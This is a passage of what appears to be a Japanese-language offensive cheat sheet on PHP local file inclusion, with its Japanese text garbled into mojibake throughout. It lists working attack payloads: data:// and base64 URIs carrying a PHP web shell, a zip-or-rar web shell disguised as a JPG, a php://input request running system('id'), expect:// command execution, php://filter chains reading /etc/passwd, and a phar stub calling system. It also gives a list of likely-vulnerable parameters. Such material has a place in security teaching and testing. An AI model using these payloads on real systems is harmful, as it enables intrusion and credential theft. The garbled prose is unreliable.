å‰ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€æ”»æ’ƒè€…ãŒ`.txt`ã§çµ‚ã‚ã‚‹æ–‡å­—åˆ—ã‚’å¿…è¦ã¨ã—ãŸãŸã‚ã€æœ€å¾Œã«`+.txt`ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚ãã®ãŸã‚ã€æ–‡å­—åˆ—ã¯ãã‚Œã§çµ‚ã‚ã‚Šã€b64ãƒ‡ã‚³ãƒ¼ãƒ‰ã®å¾Œã€ãã®éƒ¨åˆ†ã¯ãŸã ã®ã‚´ãƒŸãŒè¿”ã•ã‚Œã€å®Ÿéš›ã®PHPã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œï¼ˆã—ãŸãŒã£ã¦ã€å®Ÿè¡Œã•ã‚Œã¾ã™ï¼‰ã€‚
{% endhint %}

åˆ¥ã®ä¾‹ã¯**`php://`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ãªã„**ã‚‚ã®ã§ã™ï¼š

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python ãƒ«ãƒ¼ãƒˆè¦ç´ 

Python ã§ã¯ã€ã“ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã§:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**`file_name`**ã«**çµ¶å¯¾ãƒ‘ã‚¹**ã‚’æ¸¡ã™ã¨ã€**å‰ã®ãƒ‘ã‚¹ã¯å˜ã«å‰Šé™¤ã•ã‚Œã¾ã™**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
It is the intended behaviour according to [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒçµ¶å¯¾ãƒ‘ã‚¹ã§ã‚ã‚‹å ´åˆã€ã™ã¹ã¦ã®ä»¥å‰ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ç ´æ£„ã•ã‚Œã€çµåˆã¯çµ¶å¯¾ãƒ‘ã‚¹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‹ã‚‰ç¶šè¡Œã•ã‚Œã¾ã™ã€‚

## Java List Directories

Javaã§ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãŒã‚ã‚‹å ´åˆã€**ãƒ•ã‚¡ã‚¤ãƒ«ã®ä»£ã‚ã‚Šã«ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¦æ±‚ã™ã‚‹ã¨ã€** **ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒªã‚¹ãƒˆãŒè¿”ã•ã‚Œã¾ã™ã€‚** ä»–ã®è¨€èªã§ã¯ã“ã‚ŒãŒç™ºç”Ÿã™ã‚‹ã“ã¨ã¯ã‚ã‚Šã¾ã›ã‚“ï¼ˆç§ã®çŸ¥ã‚‹é™ã‚Šï¼‰ã€‚

## Top 25 parameters

ã“ã“ã«ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰è„†å¼±æ€§ã«å¯¾ã—ã¦è„†å¼±ã§ã‚ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ãƒˆãƒƒãƒ—25ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®ãƒªã‚¹ãƒˆãŒã‚ã‚Šã¾ã™ï¼ˆ[link](https://twitter.com/trbughunters/status/1279768631845494787)ã‹ã‚‰ï¼‰ï¼š
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHPãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ã€ãƒ‡ãƒ¼ã‚¿ãŒèª­ã¿è¾¼ã¾ã‚Œã‚‹å‰ã¾ãŸã¯æ›¸ãè¾¼ã¾ã‚Œã‚‹å‰ã«åŸºæœ¬çš„ãª**ä¿®æ­£æ“ä½œã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã«ã¯5ã¤ã®ã‚«ãƒ†ã‚´ãƒªãŒã‚ã‚Šã¾ã™ï¼š

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: ãƒ‡ãƒ¼ã‚¿ã‹ã‚‰ã‚¿ã‚°ã‚’å‰Šé™¤ã—ã¾ã™ï¼ˆ"<" ã¨ ">" æ–‡å­—ã®é–“ã®ã™ã¹ã¦ï¼‰
* ã“ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ã€ç¾ä»£ã®PHPãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‹ã‚‰æ¶ˆãˆãŸã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : ç•°ãªã‚‹ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã«å¤‰æ›ã—ã¾ã™ï¼ˆ`convert.iconv.<input_enc>.<output_enc>`ï¼‰ã€‚**ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ã™ã¹ã¦ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã®ãƒªã‚¹ãƒˆ**ã‚’å–å¾—ã™ã‚‹ã«ã¯ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã§ `iconv -l` ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

{% hint style="warning" %}
`convert.iconv.*` å¤‰æ›ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€**ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’ç”Ÿæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã€ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’è¨˜è¿°ã—ãŸã‚Šã€includeãƒ—ãƒ­ã‚»ã‚¹ã‚’ä»»æ„ã®ãƒ†ã‚­ã‚¹ãƒˆã«ã™ã‚‹ã‚ˆã†ãªé–¢æ•°ã‚’ä½œæˆã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**LFI2RCE via php filters**](lfi2rce-via-php-filters.md)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’åœ§ç¸®ã—ã¾ã™ï¼ˆå¤šãã®æƒ…å ±ã‚’å¤–éƒ¨ã«é€ä¿¡ã™ã‚‹å ´åˆã«ä¾¿åˆ©ï¼‰
* `zlib.inflate`: ãƒ‡ãƒ¼ã‚¿ã‚’è§£å‡ã—ã¾ã™
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : éæ¨å¥¨
* `mdecrypt.*` : éæ¨å¥¨
* ãã®ä»–ã®ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼
* phpã§ `var_dump(stream_get_filters());` ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ã„ãã¤ã‹ã®**äºˆæœŸã—ãªã„ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼**ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
* `consumed`
* `dechunk`: HTTPãƒãƒ£ãƒ³ã‚¯ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’é€†è»¢ã•ã›ã¾ã™
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
ã€Œphp://filterã€ã®éƒ¨åˆ†ã¯å¤§æ–‡å­—ã¨å°æ–‡å­—ã‚’åŒºåˆ¥ã—ã¾ã›ã‚“
{% endhint %}

### phpãƒ•ã‚£ãƒ«ã‚¿ã‚’ã‚ªãƒ©ã‚¯ãƒ«ã¨ã—ã¦ä½¿ç”¨ã—ã¦ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹

[**ã“ã®è¨˜äº‹ã§ã¯**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ã®å‡ºåŠ›ã‚’è¿”ã•ãšã«ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹æŠ€è¡“ãŒææ¡ˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®æŠ€è¡“ã¯ã€**phpãƒ•ã‚£ãƒ«ã‚¿ã‚’ã‚ªãƒ©ã‚¯ãƒ«ã¨ã—ã¦ä½¿ç”¨ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ–ãƒ¼ãƒ«å‹æµå‡ºï¼ˆæ–‡å­—ã”ã¨ï¼‰**ã«åŸºã¥ã„ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€phpãƒ•ã‚£ãƒ«ã‚¿ã‚’ä½¿ç”¨ã—ã¦ãƒ†ã‚­ã‚¹ãƒˆã‚’å¤§ããã—ã€phpãŒä¾‹å¤–ã‚’ã‚¹ãƒ­ãƒ¼ã™ã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã§ã™ã€‚

å…ƒã®è¨˜äº‹ã«ã¯æŠ€è¡“ã®è©³ç´°ãªèª¬æ˜ãŒã‚ã‚Šã¾ã™ãŒã€ã“ã“ã§ã¯ç°¡å˜ãªè¦ç´„ã‚’ç¤ºã—ã¾ã™ï¼š

* ã‚³ãƒ¼ãƒ‡ãƒƒã‚¯ **`UCS-4LE`** ã‚’ä½¿ç”¨ã—ã¦ãƒ†ã‚­ã‚¹ãƒˆã®å…ˆé ­ã«å…ˆè¡Œæ–‡å­—ã‚’æ®‹ã—ã€æ–‡å­—åˆ—ã®ã‚µã‚¤ã‚ºã‚’æŒ‡æ•°é–¢æ•°çš„ã«å¢—åŠ ã•ã›ã¾ã™ã€‚
* ã“ã‚Œã¯ã€**æœ€åˆã®æ–‡å­—ãŒæ­£ã—ãæ¨æ¸¬ã•ã‚ŒãŸã¨ãã«éå¸¸ã«å¤§ããªãƒ†ã‚­ã‚¹ãƒˆã‚’ç”Ÿæˆã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œ**ã€phpãŒ**ã‚¨ãƒ©ãƒ¼**ã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚
* **dechunk** ãƒ•ã‚£ãƒ«ã‚¿ã¯ã€**æœ€åˆã®æ–‡å­—ãŒ16é€²æ•°ã§ãªã„å ´åˆã¯ã™ã¹ã¦ã‚’å‰Šé™¤**ã™ã‚‹ãŸã‚ã€æœ€åˆã®æ–‡å­—ãŒ16é€²æ•°ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
* ã“ã‚Œã«ã‚ˆã‚Šã€æœ€åˆã®æ–‡å­—ãŒ16é€²æ•°æ–‡å­—ã§ãªã„ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ååˆ†ãªå¤‰æ›ã‚’è¡Œã£ãŸã¨ãã«ã€ãƒ†ã‚­ã‚¹ãƒˆã®æœ€åˆã®æ–‡å­—ã‚’æ¨æ¸¬ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚ãªãœãªã‚‰ã€16é€²æ•°ã§ã‚ã‚Œã°ã€dechunkã¯ãã‚Œã‚’å‰Šé™¤ã›ãšã€åˆæœŸã®çˆ†å¼¾ãŒphpã‚¨ãƒ©ãƒ¼ã‚’å¼•ãèµ·ã“ã™ã‹ã‚‰ã§ã™ã€‚
* ã‚³ãƒ¼ãƒ‡ãƒƒã‚¯ **convert.iconv.UNICODE.CP930** ã¯ã€ã™ã¹ã¦ã®æ–‡å­—ã‚’æ¬¡ã®æ–‡å­—ã«å¤‰æ›ã—ã¾ã™ï¼ˆã“ã®ã‚³ãƒ¼ãƒ‡ãƒƒã‚¯ã®å¾Œï¼ša -> bï¼‰ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æœ€åˆã®æ–‡å­—ãŒ `a` ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’ç™ºè¦‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã¨ãˆã°ã€6å›ã“ã®ã‚³ãƒ¼ãƒ‡ãƒƒã‚¯ã‚’é©ç”¨ã™ã‚‹ã¨ a->b->c->d->e->f->g ã¨ãªã‚Šã€ãã®æ–‡å­—ã¯ã‚‚ã¯ã‚„16é€²æ•°æ–‡å­—ã§ã¯ãªããªã‚‹ãŸã‚ã€dechunkã¯ãã‚Œã‚’å‰Šé™¤ã›ãšã€phpã‚¨ãƒ©ãƒ¼ãŒåˆæœŸã®çˆ†å¼¾ã¨ã¨ã‚‚ã«ãƒˆãƒªã‚¬ãƒ¼ã•ã‚Œã¾ã™ã€‚
* æœ€åˆã« **rot13** ã®ã‚ˆã†ãªä»–ã®å¤‰æ›ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€nã€oã€pã€qã€r ãªã©ã®ä»–ã®æ–‡å­—ã‚’æµå‡ºã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼ˆä»–ã®ã‚³ãƒ¼ãƒ‡ãƒƒã‚¯ã‚’ä½¿ç”¨ã—ã¦ä»–ã®æ–‡å­—ã‚’16é€²æ•°ç¯„å›²ã«ç§»å‹•ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼‰ã€‚
* æœ€åˆã®æ–‡å­—ãŒæ•°å­—ã®å ´åˆã€ãã‚Œã‚’base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã€æœ€åˆã®2æ–‡å­—ã‚’æµå‡ºã•ã›ã¦æ•°å­—ã‚’æµå‡ºã•ã›ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* æœ€å¾Œã®å•é¡Œã¯ã€**æœ€åˆã®æ–‡å­—ä»¥ä¸Šã®ã‚‚ã®ã‚’æµå‡ºã•ã›ã‚‹æ–¹æ³•**ã‚’è¦‹ã‚‹ã“ã¨ã§ã™ã€‚**convert.iconv.UTF16.UTF-16BEã€convert.iconv.UCS-4.UCS-4LEã€convert.iconv.UCS-4.UCS-4LE** ã®ã‚ˆã†ãªé †åºãƒ¡ãƒ¢ãƒªãƒ•ã‚£ãƒ«ã‚¿ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€æ–‡å­—ã®é †åºã‚’å¤‰æ›´ã—ã€ãƒ†ã‚­ã‚¹ãƒˆã®æœ€åˆã®ä½ç½®ã«ä»–ã®æ–‡å­—ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
* ã•ã‚‰ã«**ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹**ãŸã‚ã®ã‚¢ã‚¤ãƒ‡ã‚¢ã¯ã€**æœ€åˆã«2ãƒã‚¤ãƒˆã®ã‚¸ãƒ£ãƒ³ã‚¯ãƒ‡ãƒ¼ã‚¿ã‚’ç”Ÿæˆ**ã—ã€**convert.iconv.UTF16.UTF16**ã‚’é©ç”¨ã—ã€**UCS-4LE**ã‚’ä½¿ç”¨ã—ã¦æ¬¡ã®2ãƒã‚¤ãƒˆã¨**ãƒ”ãƒœãƒƒãƒˆ**ã•ã›ã€**ã‚¸ãƒ£ãƒ³ã‚¯ãƒ‡ãƒ¼ã‚¿ã¾ã§ãƒ‡ãƒ¼ã‚¿ã‚’å‰Šé™¤**ã™ã‚‹ã“ã¨ã§ã™ï¼ˆã“ã‚Œã«ã‚ˆã‚Šã€åˆæœŸãƒ†ã‚­ã‚¹ãƒˆã®æœ€åˆã®2ãƒã‚¤ãƒˆãŒå‰Šé™¤ã•ã‚Œã¾ã™ï¼‰ã€‚ã“ã‚Œã‚’ç¹°ã‚Šè¿”ã—ã¦ã€æµå‡ºã•ã›ãŸã„ãƒ“ãƒƒãƒˆã«åˆ°é”ã™ã‚‹ã¾ã§ç¶šã‘ã¾ã™ã€‚

ã“ã®è¨˜äº‹ã§ã¯ã€ã“ã‚Œã‚’è‡ªå‹•çš„ã«å®Ÿè¡Œã™ã‚‹ãƒ„ãƒ¼ãƒ«ã‚‚æµå‡ºã—ã¾ã—ãŸï¼š[php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit)ã€‚

### php://fd

ã“ã®ãƒ©ãƒƒãƒ‘ãƒ¼ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ãŒã‚ªãƒ¼ãƒ—ãƒ³ã—ã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚é–‹ã„ã¦ã„ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®å†…å®¹ã‚’æµå‡ºã•ã›ã‚‹ã®ã«æ½œåœ¨çš„ã«å½¹ç«‹ã¡ã¾ã™ï¼š
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
ã‚ãªãŸã¯ã¾ãŸã€**php://stdinã€php://stdoutã€ãŠã‚ˆã³ php://stderr**ã‚’ä½¿ç”¨ã—ã¦ã€ãã‚Œãã‚Œ**ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‡ã‚£ã‚¹ã‚¯ãƒªãƒ—ã‚¿0ã€1ã€ãŠã‚ˆã³2**ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼ˆæ”»æ’ƒã§ã©ã®ã‚ˆã†ã«å½¹ç«‹ã¤ã‹ã¯ä¸æ˜ã§ã™ï¼‰ã€‚

### zip:// ã¨ rar://

PHPShellã‚’å«ã‚€Zipã¾ãŸã¯Rarãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã€ãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¾ã™ã€‚\
rarãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’æ‚ªç”¨ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ã«ã¯ã€**ç‰¹ã«æœ‰åŠ¹åŒ–ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
ã“ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¯phpã®è¨­å®š **`allow_url_open`** ã¨ **`allow_url_include`** ã«ã‚ˆã£ã¦åˆ¶é™ã•ã‚Œã¦ã„ã¾ã™ã€‚

### expect://

Expectã‚’æœ‰åŠ¹ã«ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POSTãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æŒ‡å®šã—ã¦ãã ã•ã„ï¼š
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒãƒ•ã‚¡ã‚¤ãƒ«èª­ã¿è¾¼ã¿ã®ãŸã‚ã«`include`ã®ã‚ˆã†ãªé–¢æ•°ã‚’åˆ©ç”¨ã™ã‚‹éš›ã«ã€PHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®PHPã‚³ãƒ¼ãƒ‰ã‚¹ãƒ‹ãƒšãƒƒãƒˆã¯ã€`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã®ä½œæˆã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚³ãƒ³ãƒ‘ã‚¤ãƒ«ã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```bash
php --define phar.readonly=0 create_path.php
```
å®Ÿè¡Œæ™‚ã«ã€`test.phar`ã¨ã„ã†åå‰ã®ãƒ•ã‚¡ã‚¤ãƒ«ãŒä½œæˆã•ã‚Œã€ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

LFIãŒPHPã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã›ãšã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã ã‘ã®å ´åˆã€`file_get_contents()`ã€`fopen()`ã€`file()`ã€`file_exists()`ã€`md5_file()`ã€`filemtime()`ã€ã¾ãŸã¯`filesize()`ãªã©ã®é–¢æ•°ã‚’é€šã˜ã¦ã€ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ã®æ‚ªç”¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€`phar`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ã«é–¢é€£ã—ã¦ã„ã¾ã™ã€‚

`.phar`ãƒ•ã‚¡ã‚¤ãƒ«ã®æ–‡è„ˆã«ãŠã‘ã‚‹ãƒ‡ã‚·ãƒªã‚¢ãƒ©ã‚¤ã‚ºè„†å¼±æ€§ã®æ‚ªç”¨ã«ã¤ã„ã¦ã®è©³ç´°ãªç†è§£ã¯ã€ä»¥ä¸‹ã®ãƒªãƒ³ã‚¯ã•ã‚ŒãŸæ–‡æ›¸ã‚’å‚ç…§ã—ã¦ãã ã•ã„ï¼š

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

**phpãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»»æ„ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’PHPã‹ã‚‰èª­ã¿å–ã‚‹ã“ã¨ã‚’æ‚ªç”¨ã—ã¦RCEã‚’å¾—ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã—ãŸã€‚** è©³ç´°ãªèª¬æ˜ã¯[**ã“ã®æŠ•ç¨¿ã«ã‚ã‚Šã¾ã™**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**ã€‚**\
éå¸¸ã«ç°¡å˜ãªè¦ç´„ï¼šPHPãƒ’ãƒ¼ãƒ—ã®**3ãƒã‚¤ãƒˆã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼**ãŒæ‚ªç”¨ã•ã‚Œã€ç‰¹å®šã®ã‚µã‚¤ã‚ºã®ãƒ•ãƒªãƒ¼ãƒãƒ£ãƒ³ã‚¯ã®ãƒã‚§ãƒ¼ãƒ³ã‚’**å¤‰æ›´ã™ã‚‹ãŸã‚ã«**ã€**ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä½•ã§ã‚‚æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«**ã€ãƒ•ãƒƒã‚¯ãŒè¿½åŠ ã•ã‚Œã¦**`system`**ãŒå‘¼ã³å‡ºã•ã‚Œã¾ã—ãŸã€‚\
ç‰¹å®šã®ã‚µã‚¤ã‚ºã®ãƒãƒ£ãƒ³ã‚¯ã‚’å‰²ã‚Šå½“ã¦ã‚‹ã“ã¨ãŒã€ä»–ã®phpãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã‚’æ‚ªç”¨ã—ã¦å¯èƒ½ã§ã—ãŸã€‚

### ãã®ä»–ã®ãƒ—ãƒ­ãƒˆã‚³ãƒ«

ã“ã“ã«å«ã‚ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹[**ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ã•ã‚‰ã«ç¢ºèªã—ã¦ãã ã•ã„**](https://www.php.net/manual/en/wrappers.php)**ï¼š**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” ãƒ¡ãƒ¢ãƒªã¾ãŸã¯ä¸€æ™‚ãƒ•ã‚¡ã‚¤ãƒ«ã«æ›¸ãè¾¼ã‚€ï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³æ”»æ’ƒã§ã©ã®ã‚ˆã†ã«å½¹ç«‹ã¤ã‹ã¯ä¸æ˜ï¼‰
